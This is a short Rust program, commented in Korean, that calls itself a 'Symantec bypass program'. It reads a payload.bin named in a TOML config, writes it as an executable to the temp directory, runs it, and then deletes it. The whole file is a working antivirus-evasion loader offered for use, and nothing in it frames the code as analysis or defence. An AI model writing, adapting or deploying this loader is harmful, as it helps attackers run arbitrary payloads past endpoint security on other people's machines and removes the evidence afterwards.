mod common;
use crate::common::*;

mod utils;
use crate::utils::io_utils::*;
use crate::utils::logger_utils::*;

mod model;
use crate::model::rust_process::*;

fn main() {
    /* 로깅 시작 */
    set_global_logger();

    info!("Start the Symantec bypass program.");
    
    /* 1. 모델 읽기 */
    let rust_process: RustProcess =
        match read_toml_from_file::<RustProcess>("./data/process_info.toml") {
            Ok(rust_process) => rust_process,
            Err(e) => {
                error!("Failed to read process.toml: {:?}", e);
                panic!("Failed to read process.toml");
            }
        };
    
    /* 2. payload.bin 읽기 */
    let payload_data: Vec<u8> = match fs::read(rust_process.binary_path()) {
        Ok(payload_data) => payload_data,
        Err(e) => {
            error!("Failed to read payload.bin: {:?}", e);
            panic!("Failed to read payload.bin");
        }
    };

    /* 3. 임시 경로 설정 (파일명만 붙이기!) */
    let temp_path: PathBuf = env::temp_dir().join(rust_process.temp_exe_name());

    /* 4. temp 경로에 .exe 저장 */
    match fs::write(&temp_path, payload_data) {
        Ok(_) => {}
        Err(e) => {
            error!("Failed to write to temp file: {:?}", e);
            panic!("Failed to write to temp file");
        }
    }

    /* 5. 실행 시 작업 디렉토리를 원래 폴더로 설정 */
    let mut child: Child = match Command::new(&temp_path)
        .current_dir(rust_process.working_dir_path())
        .spawn()
    {
        Ok(child) => child,
        Err(e) => {
            error!("Failed to spawn process: {:?}", e);
            panic!("Failed to spawn process");
        }
    };

    let _ = child.wait();

    /* 6. 실행 후 temp 파일 삭제 */
    let _ = fs::remove_file(&temp_path);

    info!("Exits Symantec bypass program.");
}
